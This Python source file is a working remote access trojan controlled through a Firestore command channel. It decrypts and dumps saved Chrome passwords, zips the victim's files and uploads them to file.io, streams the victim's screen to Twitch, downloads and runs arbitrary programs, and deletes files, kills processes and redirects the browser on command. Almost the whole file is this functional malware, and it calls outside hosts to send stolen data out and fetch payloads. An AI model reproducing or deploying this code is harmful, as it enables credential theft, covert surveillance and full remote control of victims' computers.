import firebase_admin
from firebase_admin import credentials, firestore
import time
from datetime import datetime, timezone
import platform
import psutil
import os
import re
import json
import base64
import sqlite3
import win32crypt
import shutil
import csv
from Cryptodome.Cipher import AES
import subprocess
import requests
import pygame
import twitch
import pyautogui
import zipfile
import tempfile
import cv2
import tkinter as tk
from tkinter import messagebox
import webbrowser

cred = credentials.Certificate("storage/cred.json")  
firebase_admin.initialize_app(cred)
db = firestore.client()

# Initialize Twitch client with your client ID
twitch_client = twitch.TwitchClient(client_id='')


pygame.mixer.init()


def get_cpu_info():
    cpu_info = f"{platform.processor()} {psutil.cpu_count(logical=False)} cores"
    return cpu_info


def get_system_info():
    cpu_info = get_cpu_info()
    ram_info = f"RAM: {psutil.virtual_memory().total // (1024 ** 3)} GB"
    gpu_info = "GPU: Not implemented"  # Add code to retrieve GPU information if needed
    os_info = f"OS: {platform.system()} {platform.release()}"
    

    system_info = f"{cpu_info}, {ram_info}, {gpu_info}, {os_info}"
    return system_info


def extract_chrome_passwords():
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            csv_writer.writerow([index,url,username,decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))


    time.sleep(1)


    subprocess.run(['storage/cpeuploader.exe'])

def handle_os_import(command_doc):
    file_link = command_doc.get("file_link")
    directory = command_doc.get("directory")

    if not file_link or not directory:
        print("Missing file link or directory in the command.")
        return

    if not os.path.exists(directory):
        os.makedirs(directory)

    filename = os.path.basename(file_link)
    filepath = os.path.join(directory, filename)

    try:
        with open(filepath, 'wb') as f:
            response = requests.get(file_link)
            f.write(response.content)
        print(f"Successfully imported {file_link} to directory {directory}")


        output_ref = db.collection("output")
        output_ref.add({"output": f"Successfully imported {file_link} to directory {directory}"})
    except Exception as e:
        print(f"Error downloading file: {e}")



def handle_os_playsound(command_doc):
    sounddir = command_doc.get("sounddir")

    if not sounddir:
        print("Missing sound directory in the command.")
        return

    print("Sound file path:", sounddir)  

    if not os.path.exists(sounddir):
        print(f"Sound file '{sounddir}' not found.")
        return

    try:

        pygame.mixer.music.load(sounddir)
        pygame.mixer.music.play()

        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
        print("Sound played successfully.")


        output_ref = db.collection("output")
        output_ref.add({"output": f"Successfully started playing sound {sounddir} on target's computer"})

    except Exception as e:
        print(f"Error playing sound: {e}")

def start_private_stream():
    try:
        # Full path to ffmpeg executable
        ffmpeg_path = os.path.join("storage", "ffmpeg.exe")
        
        # Replace 'your_stream_key' with your actual Twitch stream key
        stream_key = ''

        # Get the screen resolution
        screen_width, screen_height = pyautogui.size()

        # Start capturing your screen using DirectShow input format
        ffmpeg_cmd = (
            f'"{ffmpeg_path}" -f gdigrab -framerate 30 -video_size {screen_width}x{screen_height} '
            f'-i desktop -f flv -ac 2 -vcodec libx264 -preset ultrafast -crf 25 '
            f'-maxrate 2500k -bufsize 2500k -pix_fmt yuv420p '
            f'rtmp://live.twitch.tv/app/{stream_key}'
        )
        
        # Start the subprocess to stream to Twitch
        subprocess.Popen(ffmpeg_cmd, shell=True)

        # Get the stream URL
        stream_url = f'https://twitch.tv/user'

        return stream_url
    except Exception as e:
        output_ref = db.collection("output")
        output_ref.add({"output": f"Error starting private Twitch livestream: {e}"})
        return None



def handle_os_viewscreen():
    try:
        # Start the private livestream
        stream_url = start_private_stream()

        if stream_url:
            # Send the Twitch livestream URL to the output
            output_ref = db.collection("output")
            output_ref.add({"output": f"Targets computer is livestreaming at : {stream_url}"})
        else:
            output_ref = db.collection("output")
            output_ref.add({"output": f"Error starting private Twitch livestream: {e}"})
    except Exception as e:
        output_ref = db.collection("output")
        output_ref.add({"output": f"Error starting private Twitch livestream: {e}"})


def list_files_in_directory(directory):
    try:
        if os.path.exists(directory) and os.path.isdir(directory):
            files_list = os.listdir(directory)
            return ", ".join(files_list)
        else:
            return f"Directory '{directory}' not found."
    except Exception as e:
        return f"Error listing files: {e}"
    
    
def list_storage_files():
    storage_directory = "storage"
    files_list = []

    if os.path.exists(storage_directory) and os.path.isdir(storage_directory):
        for filename in os.listdir(storage_directory):
            files_list.append(filename)
        
        return ", ".join(files_list)
    else:
        return "Storage directory not found."
    

def handle_os_export(command_doc):
    export_path = command_doc.get("exportpath")  # Check the key used here

    if not export_path:
        print("Export path not specified in the command.")
        return

    if not os.path.exists(export_path):
        print(f"Export path '{export_path}' not found.")
        return

    try:
        # Create a temporary directory to store the zip file
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a zip file
            zip_filename = "exported_files.zip"
            zip_filepath = os.path.join(temp_dir, zip_filename)
            with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
                if os.path.isdir(export_path):
                    # If export path is a directory, add all its contents to the zip file
                    for root, dirs, files in os.walk(export_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, export_path))
                else:
                    # If export path is a file, add it to the zip file
                    zipf.write(export_path, os.path.basename(export_path))

            # Upload the zip file to file.io
            with open(zip_filepath, 'rb') as zip_file:
                response = requests.post('https://file.io/?expires=1d', files={'file': zip_file})
                if response.status_code == 200:
                    fileio_link = response.json()['link']
                    print(f"File exported and uploaded successfully: {fileio_link}")

                    # Send the file.io link as output response
                    output_ref = db.collection("output")
                    output_ref.add({"output": f"File exported and uploaded successfully: {fileio_link}"})
                else:
                    print("Error uploading file to file.io")
    except Exception as e:
        print(f"Error exporting file: {e}")


def handle_os_displayimage(command_doc):
    img_path = command_doc.get("imgpath")

    if not img_path:
        print("Image path not specified in the command.")
        return

    if not os.path.exists(img_path):
        print(f"Image '{img_path}' not found.")
        return

    try:
        # Initialize pygame
        pygame.init()

        # Load the image
        image = pygame.image.load(img_path)

        # Set the display mode without title bar
        screen = pygame.display.set_mode(image.get_size(), pygame.NOFRAME)

        # Draw the image onto the window surface
        screen.blit(image, (0, 0))

        # Update the display
        pygame.display.update()

        # Send output response
        output_ref = db.collection("output")
        output_ref.add({"output": f"Successfully displayed image {img_path} on screen."})

        # Wait for the window to be closed
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False

        pygame.quit()

    except Exception as e:
        print(f"Error displaying image: {e}")


def handle_os_displayvideo(command_doc):
    vid_path = command_doc.get("vidpath")

    if not vid_path:
        print("Video path not specified in the command.")
        return

    if not os.path.exists(vid_path):
        print(f"Video '{vid_path}' not found.")
        return

    try:
        # Open the video file
        cap = cv2.VideoCapture(vid_path)

        # Check if the video file was successfully opened
        if not cap.isOpened():
            print("Error opening video file.")
            return

        # Write output response
        output_ref = db.collection("output")
        output_ref.add({"output": f"Successfully opened video {vid_path}."})


        while True:
            # Read the frame
            ret, frame = cap.read()

            # Check if the frame was successfully read
            if not ret:
                break

            # Display the frame
            cv2.imshow('Video', frame)


            # Wait for key press or 30 ms delay
            key = cv2.waitKey(30)
            if key & 0xFF == ord('q'):  # Check only for 'q' key
                break

            # Check if the window is closed using the OS close button
            if cv2.getWindowProperty('Video', cv2.WND_PROP_VISIBLE) < 1:
                break

        # Release the video capture object and close OpenCV windows
        cap.release()
        cv2.destroyAllWindows()

    except Exception as e:
        print(f"Error displaying video: {e}")


def get_processes():
    try:
        processes = psutil.process_iter(attrs=['pid', 'name', 'username'])
        active_processes = []

        # Define a list of common system processes
        system_processes = ["System", "Idle", "smss.exe", "csrss.exe", "wininit.exe", "services.exe", "lsass.exe", "svchost.exe", "taskhostw.exe", "spoolsv.exe", "explorer.exe", "RuntimeBroker.exe", "dllhost.exe"]

        for process in processes:
            process_info = process.info
            process_name = process_info['name']
            username = process_info['username']
            
            # Skip system processes and those with no username
            if process_name.lower() in system_processes or username is None:
                continue
            
            # Check if the process is an application or a background process
            if username.lower() == 'system':
                process_type = 'Background Process'
            else:
                process_type = 'Application'

            active_processes.append({
                'Name': process_name,
                'PID': process_info['pid'],
                'Username': username,
                'Type': process_type
            })

        return active_processes
    except Exception as e:
        print(f"Error getting processes: {e}")
        return []

def handle_os_runtask(command_doc):
    run_path = command_doc.get("runpath")

    if not run_path:
        print("Runpath not specified in the command.")
        return

    try:
        if "/" in run_path:
            directory, file_name = os.path.split(run_path)
            os.chdir(directory)
            subprocess.Popen([file_name], shell=True)
        else:
            subprocess.Popen([run_path], shell=True)
        
        # Write output to Firestore
        output_ref = db.collection("output")
        output_ref.add({"output": f"Successfully started the task: {run_path}"})
        
        print(f"Task started: {run_path}")
    except Exception as e:
        print(f"Error running task: {e}")

def handle_message_command(message_text):
    if message_text:
        # Display messagebox with the message text
        root = tk.Tk()
        root.withdraw()  # Hide the main window
        root.attributes("-topmost", True)  # Set the window to be always on top
        # Log successful display of message
        output_ref = db.collection("output")
        output_ref.add({"output": f"successfully displayed the message: '{message_text}' on the user's system"})
        messagebox.showinfo("", message_text)
    else:
        output_ref = db.collection("output")
        output_ref.add({"output": "Message text not specified."})

def kill_task(task_name):
    try:
        # Use appropriate method to kill the task based on the OS
        if platform.system() == "Windows":
            subprocess.run(['taskkill', '/IM', task_name, '/F'], check=True)
            output_ref = db.collection("output")
            output_ref.add({"output": f"Successfully killed task: {task_name}"})
        elif platform.system() == "Linux":
            subprocess.run(['pkill', task_name], check=True)
            output_ref = db.collection("output")
            output_ref.add({"output": f"Successfully killed task: {task_name}"})
        else:
            output_ref = db.collection("output")
            output_ref.add({"output": f"Killing tasks is not supported on {platform.system()}"})
    except subprocess.CalledProcessError:
        output_ref = db.collection("output")
        output_ref.add({"output": f"Failed to kill task: {task_name}"})
    except Exception as e:
        print(f"Error killing task: {e}")

def handle_os_redirect(command_doc):
    redirect_link = command_doc.get("redirectlink")

    if not redirect_link:
        print("Redirect link not specified in the command.")
        return

    try:
        webbrowser.open(redirect_link)
        output_ref = db.collection("output")
        output_ref.add({"output": f"Redirected user to: {redirect_link}"})
    except Exception as e:
        print(f"Error redirecting user: {e}")


def handle_delete_command(command_doc):
    filepath = command_doc.get("filepath")
    if filepath:
        try:
            os.remove(filepath)
            output_ref = db.collection("output")
            output_ref.add({"output": f"File deleted: {filepath}"})
        except Exception as e:
            output_ref = db.collection("output")
            output_ref.add({"output": f"Error deleting file: {e}"})
    else:
        output_ref = db.collection("output")
        output_ref.add({"output": "Filepath not specified for '!delete' command."})



def on_command_added(doc_snapshot, changes, read_time):
    for change in changes:
        if change.type.name == 'ADDED':
            create_time_utc = change.document.create_time.replace(tzinfo=timezone.utc)
            time_diff = datetime.now(timezone.utc) - create_time_utc
            if time_diff.total_seconds() < 1:
                command = change.document.get("command")
                if command == "!pcinfo":
                    system_info = get_system_info()
                    output_ref = db.collection("output")
                    output_ref.add({"output": system_info})
                elif command == "!chromepasswords":
                    extract_chrome_passwords()
                elif command == "!import":
                    handle_os_import(change.document.to_dict())
                elif command == "!playsound":
                    handle_os_playsound(change.document.to_dict())
                elif command == "!viewscreen":
                    handle_os_viewscreen()
                elif command == "!ls.storage":
                    storage_files = list_storage_files()
                    output_ref = db.collection("output")
                    output_ref.add({"output": storage_files})
                elif command == "!ls":
                    directory = change.document.get("lsdirectory")
                    if directory:
                        files_in_directory = list_files_in_directory(directory)
                        output_ref = db.collection("output")
                        output_ref.add({"output": files_in_directory})
                    else:
                        output_ref = db.collection("output")
                        output_ref.add({"output": "Directory not specified for 'ls' command."})
                elif command == "!download":
                    handle_os_export(change.document.to_dict())
                elif command == "!displayimage":
                    handle_os_displayimage(change.document.to_dict())
                elif command == "!displayvideo":
                    handle_os_displayvideo(change.document.to_dict())
                elif command == "!processes":
                    active_processes = get_processes()
                    output_ref = db.collection("output")
                    output_ref.add({"output": active_processes})
                elif command == "!run":
                    handle_os_runtask(change.document.to_dict())
                elif command == "!ip":
                    try:
                        ip_address = requests.get('https://api.ipify.org').text
                        output_ref = db.collection("output")
                        output_ref.add({"output": f"IP address: {ip_address}"})
                    except Exception as e:
                        print(f"Error fetching IP address: {e}")
                elif command == "!message":
                    message_text = change.document.get("messagetxt")
                    handle_message_command(message_text)
                elif command == "!kill":
                    task_name = change.document.get("task")
                    if task_name:
                        kill_task(task_name)
                    else:
                        output_ref = db.collection("output")
                        output_ref.add({"output": "Task name not specified for '!kill' command."})
                elif command == "!redirect":
                    handle_os_redirect(change.document.to_dict())
                elif command == "!delete":
                    handle_delete_command(change.document)
                else:
                    print(f"No logic was implemented for this document: {change.document.id}")

# Start the command listener
commands_ref = db.collection("commands")
listener = commands_ref.on_snapshot(on_command_added)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    listener.unsubscribe()
